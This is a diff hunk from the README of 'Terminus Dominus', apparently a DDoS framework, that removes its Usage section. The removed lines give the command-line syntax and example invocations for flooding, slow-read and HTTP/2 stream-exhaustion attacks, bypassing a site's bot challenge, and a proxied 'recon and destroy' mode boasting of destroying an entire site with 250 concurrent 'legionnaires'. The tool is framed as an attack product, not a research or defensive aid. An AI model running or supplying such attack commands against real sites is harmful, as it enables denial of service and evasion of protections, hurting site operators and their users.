@@ -54,28 +54,6 @@ Terminus Dominus was built to overcome the limitations of traditional tools in t
 ---
 
 
-### ⚔️ Usage
-
-The framework is controlled via command-line arguments.
-
-```
-usage: terminus_dominus.py [-h] -c CONCURRENCY -m {flood,slow_read,stream_exhaust,dynamic_breach,recon_and_destroy} [-p PROXIES] [-d DEPTH] [--visible-bypass] url
-```
-
-#### Usage Examples
-
-```bash
-# THE ULTIMATE ATTACK: Breach, recon, and destroy an entire site with 250 legionnaires using proxies.
-python terminus_dominus.py https://example.com -c 250 -m recon_and_destroy -p proxies.txt
-
-# Focused HTTP/2 exhaustion attack against a specific API endpoint after solving the main site's challenge.
-python terminus_dominus.py https://api.example.com/v1/data -c 150 -m stream_exhaust
-
-# See the challenge bypass in action (non-headless mode).
-python terminus_dominus.py https://example.com -c 50 -m dynamic_breach --visible-bypass
-```
-
----
 
 ### ❤️ Support the Mission
 
